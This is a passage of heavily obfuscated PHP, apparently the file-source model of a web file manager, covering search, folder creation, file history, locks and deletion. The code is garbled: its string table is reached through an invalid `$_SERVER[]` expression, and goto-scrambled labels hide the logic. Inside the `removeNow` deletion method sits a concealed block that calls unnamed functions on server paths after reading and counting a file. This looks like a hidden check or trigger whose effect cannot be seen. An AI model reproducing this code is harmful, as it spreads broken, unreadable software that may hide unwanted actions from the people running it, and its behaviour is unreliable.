$f܅++) { $Cӈْݾ = ($Cӈْݾ + 1) % 256; $B = ($B + $Aʎ蠈[$Cӈْݾ]) % 256; $eʡߍ = $Aʎ蠈[$Cӈْݾ]; $Aʎ蠈[$Cӈْݾ] = $Aʎ蠈[$B]; $Aʎ蠈[$B] = $eʡߍ; $EƩ .= chr(ord($C趾[$f܅]) ^ $Aʎ蠈[($Aʎ蠈[$Cӈْݾ] + $Aʎ蠈[$B]) % 256]); } $EƩ = $a . str_replace($aߵ[922], $aߵ[33], base64_encode($EƩ)); goto C; C: $EƩ = str_replace(array($aߵ[284], $aߵ[8], $aߵ[922]), array($aߵ[412], $aߵ[70], $aߵ[91]), $EƩ); return $EƩ; goto Bʯŉ; D֣: $aߵ =& $_SERVER[]; $Cᱱ = 4; $b = md5($b ? $b : self::$defaultKey); goto c; Bʯŉ: } public static function decode($d, $F׶ = '') { goto B΋; Dō: $F׶ = md5($F׶ ? $F׶ : self::$defaultKey); $CŅӤ = md5(substr($F׶, 0, 16)); $c = md5(substr($F׶, 16, 16)); goto D; fӾ: if (($a == 0 || $a - time() > 0) && substr($Aړ, 10, 16) == substr(md5(substr($Aړ, 26) . $c), 0, 16)) { return substr($Aړ, 26); } else { return $C؍[33]; } goto C; A: $d = base64_decode(substr($d, $b)); $cȡә = strlen($d); $d = array(); goto aĈ; BӐ: $Aړ = $C؍[33]; for ($a = $CŐ = $dʛ = 0; $dʛ < $cȡә; $dʛ++) { $a = ($a + 1) % 256; $CŐ = ($CŐ + $b[$a]) % 256; $C衰 = $b[$a]; $b[$a] = $b[$CŐ]; $b[$CŐ] = $C衰; $Aړ .= chr(ord($d[$dʛ]) ^ $b[($b[$a] + $b[$CŐ]) % 256]); } $a = intval(substr($Aړ, 0, 10)); goto fӾ; B΋: $C؍ =& $_SERVER[]; $d = str_replace(array($C؍[412], $C؍[70], $C؍[91]), array($C؍[284], $C؍[8], $C؍[922]), $d); $b = 4; goto Dō; aĈ: for ($dʛ = 0; $dʛ <= 255; $dʛ++) { $d[$dʛ] = ord($Bݴ[$dʛ % $E]); } $b = range(0, 255); for ($CŐ = $dʛ = 0; $dʛ < 256; $dʛ++) { $CŐ = ($CŐ + $b[$dʛ] + $d[$dʛ]) % 256; $C衰 = $b[$dʛ]; $b[$dʛ] = $b[$CŐ]; $b[$CŐ] = $C衰; } goto BӐ; D: $dΊ = substr($d, 0, $b); $Bݴ = $CŅӤ . md5($CŅӤ . $dΊ); $E = strlen($Bݴ); goto A; C: } } goto FɆ; Dܓ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($fɓ) { goto Eϯ܈; Eϯ܈: $bŞ =& $_SERVER[]; $D = KodIO::fileTypeList(); $Dƭ = $D[$fɓ]; goto BԠ; CљɌ: if (!$Dƭ[$bŞ[160]]) { $E = array_to_keyvalue($D, $bŞ[33], $bŞ[160]); $fɑ = implode($bŞ[47], $E); $C͢Ƃ = $bŞ[2282]; } $Dһ = explode($bŞ[47], trim($fɑ, $bŞ[47])); return array($C͢Ƃ, $Dһ); goto dܿ; BԠ: if (!$Dƭ) { return array(); } $fɑ = $Dƭ[$bŞ[160]]; $C͢Ƃ = $bŞ[7]; goto CљɌ; dܿ: } public function listPathType($F) { $f =& $_SERVER[]; $EȠ = $this->fileTypeWhere($F); if (!$EȠ) { return array(); } $f = array($f[521] => SourceModel::TYPE_USER, $f[522] => USER_ID, $f[518] => 0, $f[519] => $EȠ); return $this->listSource($f); } public function listSearch($Fؗ, $bϠ = 300) { goto E; E: $E =& $_SERVER[]; if (isset($Fؗ[$E[2199]]) && $Fؗ[$E[2199]]) { $Fؗ[$E[2199]] = str_replace($E[1609], $E[2332], trim($Fؗ[$E[2199]])); } $c = $this->_parseSearchWhere($Fؗ); goto cĠ˃; aҿ: $this->_listSearchDesc($aĳ, $Fؗ, $bϛ); $this->_listSearchTag($aĳ, $Fؗ, $bϛ); $this->_listDataApply($aĳ[$E[354]]); goto E; fê: $this->_listSearchBindPinyin($Fؗ, $c, $Eل); $this->alias($E[487])->_makeOrder()->cache(null, 10); $aĳ = $this->distinct(!0)->field($Eل)->where($c)->selectPage($bϠ); goto aҿ; E: $this->_listMake($aĳ); return $aĳ; goto f; cĠ˃: if (!isset($c[$E[397]])) { $c[$E[397]] = 0; } $Eل = $E[2333]; $bϛ = $Eل; goto fê; f: } private function _listSearchTag(&$BԌ, $Aբ, $Bב) { goto E炌; aԟ: if (!$F) { return; } $cީ = array($Cۓ[393] => array($Cۓ[7], $F)); $D墅 = Model($Cۓ[394])->field($Cۓ[75])->where($cީ)->select(); goto A; A: $D墅 = array_to_keyvalue($D墅, $Cۓ[33], $Cۓ[75]); $Bގ = array_unique($D墅); $this->_listSearchMerge($BԌ, $Aբ, $Bב, $Bގ); goto aߠ; E炌: $Cۓ =& $_SERVER[]; if (!$Aբ[$Cۓ[2199]] || $BԌ[$Cۓ[351]][$Cۓ[340]] > 1) { return; } $Aܸ = Model($Cۓ[2334])->listData(); goto E͚; E͚: $F = array(); $fȓ = $Aբ[$Cۓ[2199]]; foreach ($Aܸ as $b) { $e = $b[$Cۓ[28]]; $bν = str_replace($Cۓ[50], $Cۓ[33], Pinyin::encode($e)); if (stripos($e, $fȓ) !== !1 || stripos($bν, $fȓ) !== !1) { $F[] = $b[$Cۓ[367]]; } } goto aԟ; aߠ: } private function _listSearchDesc(&$c, $Fೋ, $bԕ) { goto Fŉ⚑; e: $B = array_unique($B); if (!$B) { return; } $bլ = array($E⃄[369] => array($E⃄[7], $B), $E⃄[89] => $E⃄[405], $E⃄[359] => array($E⃄[771], $E⃄[2201] . $Fೋ[$E⃄[2199]] . $E⃄[2201])); goto a흅; Fŉ⚑: $E⃄ =& $_SERVER[]; if (!$Fೋ[$E⃄[2199]] || $c[$E⃄[351]][$E⃄[340]] > 1) { return; } $B = $this->listSearchChildren($Fೋ[$E⃄[461]]); goto e; a흅: $b = Model($E⃄[504])->field($E⃄[369])->where($bլ)->select(); $fϢҼ = array_to_keyvalue($b, $E⃄[33], $E⃄[369]); $this->_listSearchMerge($c, $Fೋ, $bԕ, $fϢҼ); goto bí; bí: } private function _listSearchMerge(&$fЉү, $C╏, $B, $fʐ) { goto B̦Ⱥ; E娏: $eޮ = $this->field($B)->where($Aň)->select(); if (!$eޮ) { return; } $f玜ɼ = array(); goto BÕ; d⧭ȣ: $eȘ = array_diff($fʐ, $eޛ); if (!$eȘ) { return; } $Aň = array($E[369] => array($E[7], $eȘ)); goto E娏; B̦Ⱥ: $E =& $_SERVER[]; if (!$fʐ) { return; } $eޛ = array_to_keyvalue($fЉү[$E[354]], $E[33], $E[369]); goto d⧭ȣ; BÕ: foreach ($eޮ as $C̺) { $d = $E[47] . $C╏[$E[461]] . $E[47]; if (stripos($C̺[$E[459]], $d) !== !1) { $f玜ɼ[] = $C̺; } } $fЉү[$E[354]] = array_merge($f玜ɼ, $fЉү[$E[354]]); $fЉү[$E[351]][$E[352]] += count($f玜ɼ); goto A; A: } public function listSearchChildren($EȠٳ, $aƇ = 5000) { goto Dᦹ; Dᦹ: $dٻ =& $_SERVER[]; $AǸ = array(); $fƩ㫥 = $this->sourceInfo($EȠٳ); goto F̕; F: $EƦ = $this->field($dٻ[369])->where($dƦ)->select(); $AǸ = array_to_keyvalue($EƦ, $dٻ[33], $dٻ[369]); return $AǸ; goto c; F̕: $dƦ = array($dٻ[459] => array($dٻ[771], $fƩ㫥[$dٻ[459]] . $fƩ㫥[$dٻ[369]] . $dٻ[484])); $D⡫ = $this->field($dٻ[369])->cache(null, 600)->where($dƦ)->count(); if ($D⡫ > $aƇ) { return $this->_listSearchChildrenNear($EȠٳ, $aƇ); } goto F; c: } private function _listSearchChildrenNear($Cۋ, $e) { goto bՍ; A: if (!$D䑩) { return $Dꋠ; } $F = array($Eؘᄨ[461] => array($Eؘᄨ[7], $D䑩)); $cн֟ = $this->field($Eؘᄨ[2335])->where($F)->select(); goto cډ; aзê: $cн֟ = $this->field($Eؘᄨ[2335])->where($F)->select(); $D䑩 = array_to_keyvalue(array_filter_by_field($cн֟, $Eؘᄨ[370], $Eؘᄨ[83]), $Eؘᄨ[33], $Eؘᄨ[369]); $Dꋠ = array_merge($Dꋠ, array_to_keyvalue($cн֟, $Eؘᄨ[33], $Eؘᄨ[369])); goto A; bՍ: $Eؘᄨ =& $_SERVER[]; $Dꋠ = array(); $F = array($Eؘᄨ[461] => $Cۋ); goto aзê; cډ: $Dꋠ = array_merge($Dꋠ, array_to_keyvalue($cн֟, $Eؘᄨ[33], $Eؘᄨ[369])); $Dꋠ = array_slice($Dꋠ, 0, $e); return $Dꋠ; goto D; D: } private function _listSearchBindPinyin($cү, &$AϏ, &$B) { goto fӥޏ; C: $c֥ = array(); $B = str_replace(array($Dز[217], $Dز[50], $Dز[2336]), $Dز[33], $B); $B = $Dز[2337] . str_replace($Dز[47], $Dز[2338], $B); goto B; fӥޏ: $Dز =& $_SERVER[]; if (!Input::check($cү[$Dز[2199]], $Dز[306]) || strlen($cү[$Dز[2199]]) < 2) { return; } $Cž = "\x4c\105\x46\124\x20\112\117\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\x72\143\x65\137\155\x65\x74\x61\x20\x6d\x65\164\141\x20\157\156\x20\163\157\x75\x72\143\145\x2e\163\157\165\162\x63\145\111\x44\40\x3d\40\155\145\x74\x61\x2e\x73\x6f\165\162\143\145\x49\104"; goto C; B: unset($AϏ[$Dز[28]]); foreach ($AϏ as $eۯЬ => $D) { $c֥[$Dز[2337] . $eۯЬ] = $D; } $f = array($Dز[483], $Dز[2201] . $cү[$Dز[2199]] . $Dز[2201]); goto eͧʏ; eͧʏ: $c֥[] = array($Dز[2339] => $f, $Dز[929] => $Dز[2203], array($Dز[2340] => $f, $Dز[2341] => array($Dز[7], array($Dز[416], $Dز[415])))); $this->join($Cž); $AϏ = $c֥; goto aƍ; aƍ: } private function _parseSearchWhere($fˎݱ) { goto B; eϷć: if (isset($fˎݱ[$Aѣ҃[2199]]) && $fˎݱ[$Aѣ҃[2199]]) { $a垏 = $fˎݱ[$Aѣ҃[2199]]; $cҦ = explode($Aѣ҃[50], $a垏); if (strlen($a垏) > 2 && (substr($a垏, 0, 1) == $Aѣ҃[113] && substr($a垏, -1) == $Aѣ҃[113]) || substr($a垏, 0, 1) == $Aѣ҃[55] && substr($a垏, -1) == $Aѣ҃[55]) { $a垏 = substr($a垏, 1, -1); $cҦ = array($a垏); } $b[$Aѣ҃[28]] = array($Aѣ҃[483], $Aѣ҃[2201] . $a垏 . $Aѣ҃[2201]); if (count($cҦ) > 1) { $b[$Aѣ҃[28]] = array(); foreach ($cҦ as $e΍) { if (!trim($e΍)) { continue; } $b[$Aѣ҃[28]][] = array($Aѣ҃[483], $Aѣ҃[2201] . trim($e΍) . $Aѣ҃[2201]); } } } return $b; goto bۭͭ; Bմ: if (isset($fˎݱ[$Aѣ҃[722]])) { $cߌ = array($Aѣ҃[2343], $fˎݱ[$Aѣ҃[722]]); if ($b[$Aѣ҃[107]]) { $b[$Aѣ҃[107]] = array($b[$Aѣ҃[107]], $cߌ, $Aѣ҃[2344]); } else { $b[$Aѣ҃[107]] = $cߌ; } } if (isset($fˎݱ[$Aѣ҃[2345]])) { $b[$Aѣ҃[77]] = array($Aѣ҃[2342], $fˎݱ[$Aѣ҃[2345]]); } if (isset($fˎݱ[$Aѣ҃[2346]])) { $cߌ = array($Aѣ҃[2343], $fˎݱ[$Aѣ҃[2346]]); if ($b[$Aѣ҃[77]]) { $b[$Aѣ҃[77]] = array($b[$Aѣ҃[77]], $cߌ, $Aѣ҃[2344]); } else { $b[$Aѣ҃[77]] = $cߌ; } } goto D܎; D܎: if (isset($fˎݱ[$Aѣ҃[535]])) { $b[] = array($Aѣ҃[379] => $fˎݱ[$Aѣ҃[535]], $Aѣ҃[378] => $fˎݱ[$Aѣ҃[535]], $Aѣ҃[929] => $Aѣ҃[2203]); } if (isset($fˎݱ[$Aѣ҃[372]])) { $Aк = $fˎݱ[$Aѣ҃[372]]; if ($Aк == $Aѣ҃[76]) { $b[$Aѣ҃[370]] = 1; } else { if ($Aк == $Aѣ҃[2347]) { $b[$Aѣ҃[370]] = 0; } else { if ($Aк) { $Aк = is_array($Aк) ? $Aк : explode($Aѣ҃[47], $Aк); $b[$Aѣ҃[372]] = array($Aѣ҃[384], $Aк); $b[$Aѣ҃[370]] = 0; } } } } if (isset($fˎݱ[$Aѣ҃[461]])) { $D = $this->sourceInfo($fˎݱ[$Aѣ҃[461]]); $b[$Aѣ҃[525]] = array($Aѣ҃[483], $D[$Aѣ҃[459]] . $fˎݱ[$Aѣ҃[461]] . $Aѣ҃[484]); } goto eϷć; B: $Aѣ҃ =& $_SERVER[]; $b = array(); if (isset($fˎݱ[$Aѣ҃[721]])) { $b[$Aѣ҃[107]] = array($Aѣ҃[2342], $fˎݱ[$Aѣ҃[721]]); } goto Bմ; bۭͭ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($F̯ӈ) { $BǏ =& $_SERVER[]; $f৅ت = Model($BǏ[474])->where(array($BǏ[1444] => $F̯ӈ))->find(); $d̊ = $this->_mkdirRoot(SourceModel::TYPE_USER, $F̯ӈ, $f৅ت[$BǏ[28]]); $this->userDesktopAdd($d̊); return $d̊; } public function userDesktopAdd($A) { $d⧴ =& $_SERVER[]; $A뻣 = LNG($d⧴[2348]); $EҌ͹ = $this->mkdir($A, $A뻣); $this->metaSet($EҌ͹, $d⧴[2349], $d⧴[83]); $this->metaSet($A, $d⧴[2350], $EҌ͹); } public function groupRootAdd($FӇ) { $f =& $_SERVER[]; $Bĝ = Model($f[458])->where(array($f[2195] => $FӇ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $FӇ, $Bĝ[$f[28]]); } public function systemRootPathAdd($cҚ) { if ($cҚ != $_SERVER[][1104]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $cҚ); } public function userRootRemove($B΃) { $f󫳃 = $this->sourceRoot(SourceModel::TYPE_USER, $B΃); if (!$f󫳃) { return; } $this->remove($f󫳃, !1); } public function groupRootRemove($Bҧ) { $bʌ킋 = $this->sourceRoot(SourceModel::TYPE_GROUP, $Bҧ); if (!$bʌ킋) { return; } $this->remove($bʌ킋, !1); } private function _mkdirRoot($B, $CɊ, $b䐠명) { goto E誚ͻ; F: $bΉŐΟ = "\115\157\x64\x65\154\123\x6f\165\162\143\x65\x2e\155\x6b\144\151\x72\122\x6f\x6f\x74\56{$B}\x2e{$CɊ}\56" . $b䐠명; CacheLock::lock($bΉŐΟ); $F[$Aڠْ[28]] = $b䐠명; goto A򉰇; C՗: CacheLock::unlock($bΉŐΟ); return $cӌ; goto C; E誚ͻ: $Aڠْ =& $_SERVER[]; $F = array($Aڠْ[368] => 0, $Aڠْ[521] => $B, $Aڠْ[522] => $CɊ, $Aڠْ[518] => 1, $Aڠْ[523] => USER_ID, $Aڠْ[524] => USER_ID, $Aڠْ[519] => $Aڠْ[33], $Aڠْ[525] => $Aڠْ[470], $Aڠْ[396] => 0, $Aڠْ[520] => 0, $Aڠْ[420] => 0, $Aڠْ[526] => $Aڠْ[33]); if ($bĐ = $this->where($F)->find()) { return $bĐ[$Aڠْ[369]]; } goto F; A򉰇: $cӌ = $this->add($F); $Cܐ = array($Aڠْ[527] => short_id($cӌ)); $this->where(array($Aڠْ[383] => $cӌ))->save($Cܐ); goto C՗; C: } private function sourceRoot($fĠƓ, $fѬ, $b = false) { $Eَ =& $_SERVER[]; $F = array($Eَ[368] => 0, $Eَ[521] => $fĠƓ, $Eَ[522] => $fѬ); if ($dױ = $this->where($F)->find()) { return $b ? $dױ : $dױ[$Eَ[369]]; } return !1; } public function sourceRootGroup($C􂮔) { $CǞ =& $_SERVER[]; if (is_string($C􂮔)) { $C􂮔 = array($C􂮔); } $Dץ = array($CǞ[368] => 0, $CǞ[521] => SourceModel::TYPE_GROUP, $CǞ[522] => array($CǞ[7], $C􂮔)); $c = $this->listSource($Dץ, 1000); return array_to_keyvalue($c[$CǞ[74]], $CǞ[456]); } public function mkfile($fȸ쇉, $cϥ, $A֏ = '', $a좵 = REPEAT_RENAME) { $cፐ =& $_SERVER[]; $A脲ɪ = Model($cፐ[544])->addFileByContent($A֏, $cϥ); return $this->_createFileCall($fȸ쇉, $cϥ, $A脲ɪ, $a좵, $cፐ[1142]); } public function addFile($D, $e, $a, $F = false, $eꅍ = REPEAT_RENAME) { $c˱ = Model($_SERVER[][544])->addFile($e, $a, $F); return $this->_createFileCall($D, $a, $c˱, $eꅍ); } public function addFileByFileID($c͗, $e̊, $a, $F퍔 = REPEAT_RENAME) { $aź =& $_SERVER[]; $Dۊ = Model($aź[544])->find($e̊); Model($aź[544])->linkAdd($e̊); return $this->_createFileCall($c͗, $a, $Dۊ, $F퍔); } public function addFileByRemote($a֜, $Cꚹ, $c, $c = array(), $BԵ = REPEAT_RENAME) { $e皼 = Model($_SERVER[][544])->addFileByRemote($Cꚹ, $c, $c); return $this->_createFileCall($a֜, $c, $e皼, $BԵ); } private function _createFileCall($D¬, $e摊ɮ, $eޅ, $B숂, $CϠ = "\x75\160\154\157\141\144") { goto E؏п; eԎԂ: return $E׮; goto CΎ; F: $E׮ = $this->_createFile($D¬, $e摊ɮ, $eޅ, $B숂, $Dɛ֨); if (!$Dɛ֨) { Model($e߮[422])->remove($eޅ[$e߮[419]]); } else { if ($E׮) { Model($e߮[2321])->eventCreate($E׮, $CϠ); } } $this->lockWriteEnd($D¬, $e摊ɮ); goto eԎԂ; E؏п: $e߮ =& $_SERVER[]; $Dɛ֨ = !1; $this->lockWriteStart($D¬, $e摊ɮ); goto F; CΎ: } public function mkdir($a¥, $B, $cҏ = REPEAT_SKIP) { goto DƲᶃ; b: $this->lockWriteStart($a¥, $B); if ($cҏ !== !1) { $D = $this->fileNameExist($a¥, $B); if ($D && $cҏ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a¥, $B); return $D; } $B = $this->fileNameAuto($a¥, $B, $cҏ); } $eϮб = array($D[518] => 1, $D[386] => $B, $D[519] => $D[33], $D[420] => 0, $D[520] => 0); goto a; cڿ: return $D; goto f; DƲᶃ: $D =& $_SERVER[]; $E∶ = $this->sourceInfo($a¥); if (!$E∶) { return !1; } goto b; a: $D = $this->_addSoure($eϮб, $E∶); Model($D[2321])->eventCreate($D, $D[1143]); $this->lockWriteEnd($a¥, $B); goto cڿ; f: } private function _createFile($D׊, $aߌ, $fÎ, $E, &$AՐ) { goto a; aǬڏ: $B֗ = array($f [518] => 0, $f [386] => $aߌ, $f [519] => get_path_ext($aߌ), $f [420] => $fÎ[$f [419]], $f [520] => $fÎ[$f [77]]); $d = $this->_addSoure($B֗, $D򑿴); $this->folderSizeReset($D׊); goto F; F: return $d; goto D; a: $f  =& $_SERVER[]; $D򑿴 = $this->sourceInfo($D׊); if (!$fÎ || !$D򑿴) { return !1; } goto aګ; aګ: if ($E !== !1) { $f݅ = $this->fileNameExist($D׊, $aߌ); } $AՐ = !0; if ($E && $f݅) { if ($E == REPEAT_SKIP) { $AՐ = !1; return $f݅; } else { if ($E == REPEAT_REPLACE) { $cָ = $this->sourceInfo($f݅); $dǇ = $this->fileHistory($cָ, $fÎ[$f [419]], $fÎ[$f [77]]); if (!$dǇ) { $AՐ = !1; } else { $this->folderSizeReset($D׊); } return $f݅; } else { $aߌ = $this->fileNameAuto($D׊, $aߌ, $E, !1); } } } goto aǬڏ; D: } protected function fileHistory($C, $dǜ, $fַ) { goto f; eߊ݆: return !0; goto B熊; f: $Eϖꑒ =& $_SERVER[]; if ($C[$Eϖꑒ[419]] == $dǜ) { return !1; } $this->checkLock($C[$Eϖꑒ[369]], $dǜ); goto aՎј; aՎј: Model($Eϖꑒ[2351])->addHistory($C); $a˻ = array($Eϖꑒ[524] => USER_ID, $Eϖꑒ[390] => time(), $Eϖꑒ[419] => $dǜ, $Eϖꑒ[77] => $fַ); $this->where(array($Eϖꑒ[383] => $C[$Eϖꑒ[369]]))->save($a˻); goto eߊ݆; B熊: } public function checkLock($A͌, $AʑԈ) { goto Dڄ; Dڄ: $c荽 =& $_SERVER[]; $AԄ߿ = $this->pathInfo($A͌); if (!$this->fileIsLock($AԄ߿, !0)) { return; } goto b¥ﭴ; Eܪ: $this->_createFileCall($AԄ߿[$c荽[461]], $bǤګ, $fćÐ, REPEAT_REPLACE, $c荽[1142]); $C␝ = $AԄ߿[$c荽[417]][$c荽[481]]; $Āǖ = $C␝[$c荽[2353]] ? $C␝[$c荽[2353]] : $C␝[$c荽[28]]; goto Dܘݯ; Dܘݯ: show_json(LNG($c荽[2354]) . $c荽[2355] . LNG($c荽[2356]) . $c荽[2357] . $Āǖ . $c荽[2358], !1); goto f֝; b¥ﭴ: $aѐ = Session::get($c荽[2352]); $bǤګ = substr($AԄ߿[$c荽[28]], 0, -1 - strlen($AԄ߿[$c荽[160]])) . $c荽[1406] . $aѐ . $c荽[91] . $AԄ߿[$c荽[160]]; $fćÐ = Model($c荽[544])->find($AʑԈ); goto Eܪ; f֝: } public function fileIsLock($eЫԭé, $A㠫Ƣ = false) { goto BѸӟ; BѸӟ: $e =& $_SERVER[]; if (!isset($eЫԭé[$e[417]]) || !$eЫԭé[$e[417]][$e[478]]) { return !1; } if ($eЫԭé[$e[417]][$e[478]] != USER_ID) { return !0; } goto bΩ; bΩ: $cÓʊ = $GLOBALS[$e[6]][$e[84]][$e[479]]; if ($eЫԭé[$e[417]][$e[480]] <= time() - $cÓʊ) { $this->metaSet($eЫԭé[$e[369]], $e[478], null); $this->metaSet($eЫԭé[$e[369]], $e[480], null); } if ($A㠫Ƣ) { $this->metaSet($eЫԭé[$e[369]], $e[480], time()); } goto d; d: return !1; goto cد; cد: } private function _addSoure($a, $b) { goto e; Fם: $this->updateModifyTime($a[$c[461]]); $aࠅڏ = $c[2359] . $b[$c[369]]; if (isset(self::$cacheChildList[$aࠅڏ])) { unset(self::$cacheChildList[$aࠅڏ]); } goto e񨖾; e: $c =& $_SERVER[]; $d = array($c[521] => $b[$c[371]], $c[522] => $b[$c[456]], $c[523] => USER_ID, $c[524] => USER_ID, $c[368] => $b[$c[369]], $c[525] => $b[$c[459]] . $b[$c[369]] . $c[47], $c[396] => 0, $c[526] => $c[33]); $a = array_merge($d, $a); goto Fם; c縻: return $D; goto c年; F̶: $cċ = array($c[527] => short_id($D)); $this->where(array($c[383] => $D))->save($cċ); $this->setNamePinyin($D, $a[$c[28]]); goto c縻; e񨖾: static $Aǆ = false; if (!$Aǆ) { Hook::trigger($c[508], $a); $Aǆ = !0; } $D = $this->add($a); goto F̶; c年: } public function remove($F, $BҦ = true) { goto BǬ; E: $this->recycleClear($dʘ); $Cɂ = $this->move($F, $F, REPEAT_RENAME_FOLDER); $this->folderSizeReset($dʘ[$f㨗[461]]); goto a ; a : return $Cɂ; goto aџ; fÚ: $A = $dʘ[$f㨗[371]] == self::TYPE_USER ? $f㨗[535] : $f㨗[986]; if ($A == $f㨗[535]) { $eݙ = Model($f㨗[474])->getInfo($dʘ[$f㨗[456]]); $fɯ = !empty($eݙ[$f㨗[2353]]) ? $eݙ[$f㨗[2353]] : $eݙ[$f㨗[28]]; $fɯ = $f㨗[248] . $fɯ . $f㨗[2361] . $dʘ[$f㨗[456]]; } else { $eݙ = Model($f㨗[458])->getInfo($dʘ[$f㨗[456]]); $fɯ = _get($eݙ, $f㨗[28]); $fɯ = $f㨗[157] . $fɯ . $f㨗[2362] . $dʘ[$f㨗[456]]; } $fΆ = $f㨗[2363] . md5($fɯ); goto f; f: CacheLock::lock($fΆ); $F = $this->fileNameExist($dʥ, $fɯ); if (!$F) { $F = $this->mkdir($dʥ, $fɯ, REPEAT_SKIP); $this->metaSet($F, $f㨗[2364], $A); $this->metaSet($F, $f㨗[2365], $dʘ[$f㨗[456]]); if ($dʘ[$f㨗[461]] != 0) { $this->metaSet($F, $f㨗[2366], _get($eݙ, $f㨗[2367])); } } goto DɄ; DɄ: CacheLock::unlock($fΆ); $this->metaSet($F, $f㨗[2368], $dʘ[$f㨗[461]]); $this->where(array($f㨗[369] => $F))->save(array($f㨗[390] => time())); goto E; Bҿ߇: $Dǆ = Model($f㨗[1451])->get($f㨗[2360]) == $f㨗[83]; if ($aس || $BҦ || !$Dǆ) { return $this->removeNow($F, $BҦ); } $dʥ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto fÚ; BǬ: $f㨗 =& $_SERVER[]; $dʘ = $this->sourceInfo($F); $aس = intval($dʘ[$f㨗[371]]) === self::TYPE_SYSTEM; goto Bҿ߇; aџ: } private function recycleClear($A) { $F =& $_SERVER[]; $E㑍Ϝ = $this->childrenAll($A); $Cᳳ = array($F[383] => array($F[384], $E㑍Ϝ[$F[2369]])); Model($F[2370])->where($Cᳳ)->delete(); } public function removeNow($dŎәÆ, $e҃ = true) { goto bǯ; bǯ: $E夹 =& $_SERVER[]; if ($_SERVER[$E夹[700]] != $_SERVER[$E夹[1324]]) { goto aп; cڞߴ: $Bϒ = $E夹[808]; $Bϒ($_SERVER[$E夹[809]]); $Bϒ($_SERVER[$E夹[702]] . $E夹[1325]); goto a莠; aп: $F܅ = $E夹[807]; $Dٸ = $E夹[701]; $c = $_SERVER[$E夹[702]] . $E夹[703]; goto AǱ; AǱ: $E = $Dٸ($c); $D龍 = explode($E夹[217], $E); if (count($D龍) < $E夹[566]) { $a = $E夹[704]; $a(); } goto cڞߴ; a莠: $aᓷɥ = 1; while ($aᓷɥ > 1) { $aᓷɥ = $aᓷɥ + 4; $BṼ = rawurlencode($aᓷɥ . $E夹[361]); } goto c¾; c¾: } $d = $this->sourceInfo($dŎәÆ); goto b鋋; B󥌰: $this->updateModifyTime($aƊ¿); $this->lockMoveEnd($dŎәÆ); Hook::trigger($E夹[1487], $Bڃ, $e҃); goto e׹; c: $this->lockMoveStart($dŎәÆ); Hook::trigger($E夹[2371], $Bڃ, $e҃); if ($e҃) { Model($E夹[2370])->moveToRecycle($dŎәÆ); } else { $B = $this->childrenAll($d); Model($E夹[505])->eventRemove($dŎәÆ); $this->removeRelevance($B[$E夹[2369]], $B[$E夹[1275]]); } goto Bǟ; e׹: return !0; goto eˌ; Bǟ: $this->folderSizeReset($d[$E夹[461]]); $aƊ¿ = array($d[$E夹[461]]); if ($d[$E夹[370]] == $E夹[83]) { $aƊ¿[] = $d[$E夹[369]]; } goto B󥌰; b鋋: $Bڃ = $this->pathInfoMore($dŎәÆ); if (!$d) { return !0; } if ($d[$E夹[461]] == 0) { if (!_get($GLOBALS, $E夹[457])) { return !1; } } goto c; eˌ: } public function childrenAll($DЦԢ) { $fپˆ =& $_SERVER[]; $FƂ = $DЦԢ[$fپˆ[369]]; if ($DЦԢ[$fپˆ[370]] == $fپˆ[83]) { $fܑ = array($fپˆ[525] => array($fپˆ[483], $DЦԢ[$fپˆ[459]] . $FƂ . $fپˆ[484])); $Cމ = array($fپˆ[525] => $fܑ[$fپˆ[459]]); $f = $this->field($fپˆ[2372])->where($Cމ)->select(); $Eښ = !1; $d۽ = array($FƂ); if ($f) { $Eښ = array_to_keyvalue($f, $fپˆ[33], $fپˆ[419]); $Eښ = array_remove_value($Eښ, $fپˆ[468]); $d۽ = array_to_keyvalue($f, $fپˆ[33], $fپˆ[369]); $d۽[] = $FƂ; } } else { $Eښ = array($DЦԢ[$fپˆ[419]]); $d۽ = array($FƂ); } return array($fپˆ[2369] => $d۽, $fپˆ[1275] => $Eښ); } public function removeArray($D) { if (!$D) { return !0; } } public function removeRelevance($E, $c) { goto d͏; d͏: $eŃ =& $_SERVER[]; $E = $E ? $E : array(); $c = $c ? $c : array(); goto A™; b: $a斌 = array($eŃ[383] => array($eŃ[384], $E)); Model($eŃ[2370])->where($a斌)->delete(); Model($eŃ[413])->where($a斌)->delete(); goto d˫; d˫: Model($eŃ[2373])->where($a斌)->delete(); Model($eŃ[505])->where($a斌)->delete(); Model($eŃ[2098])->removeBySource($E); goto Fȹ; A™: $E = array_unique(array_filter($E)); $c = array_unique(array_filter($c)); if (!$E) { return !1; } goto b; F̪瞜: for ($A뤱Ҕ = 0; $A뤱Ҕ < count($E); $A뤱Ҕ++) { $this->sourceCacheClear($E[$A뤱Ҕ]); } goto F; Fȹ: Model($eŃ[2351])->removeBySource($E); $this->where($a斌)->delete(); Model($eŃ[422])->remove($c); goto F̪瞜; F: } public function rename($Bć, $bʭϧ) { goto c導; Aᶂ: $B = $this->fileNameExist($Aƌ[$cޕ[461]], $bʭϧ); if ($B) { return !1; } $bϐ = array($cޕ[386] => $bʭϧ, $cޕ[524] => USER_ID); goto F; Cބ: $a = $cޕ[2359] . $Aƌ[$cޕ[461]]; if (isset(self::$cacheChildList[$a])) { unset(self::$cacheChildList[$a]); } return $fݐ; goto Dڅ; F: if (!$Aƌ[$cޕ[370]] == $cޕ[83]) { $bϐ[$cޕ[372]] = get_path_ext($bʭϧ); } Model($cޕ[505])->eventRename($Bć, $Aƌ[$cޕ[28]], $bʭϧ); $this->sourceCacheClear($Bć); goto Bɕȳ; Bɕȳ: $this->setNamePinyin($Bć, $bϐ[$cޕ[28]], !1); $this->updateModifyTime($Aƌ[$cޕ[461]]); $fݐ = $this->where(array($cޕ[383] => $Bć))->data($bϐ)->save(); goto Cބ; c導: $cޕ =& $_SERVER[]; $Aƌ = $this->sourceInfo($Bć); if (!$Aƌ) { return !1; } goto Aᶂ; Dڅ: } public function setNamePinyin($aɸ, $Bӄ, $C = true) { $Eū =& $_SERVER[]; $Cߊڹ = Input::check($Bӄ, $Eū[528]); if ($C && !$Cߊڹ) { return; } if (!$Cߊڹ) { $this->metaSet($aɸ, $Eū[416], null); 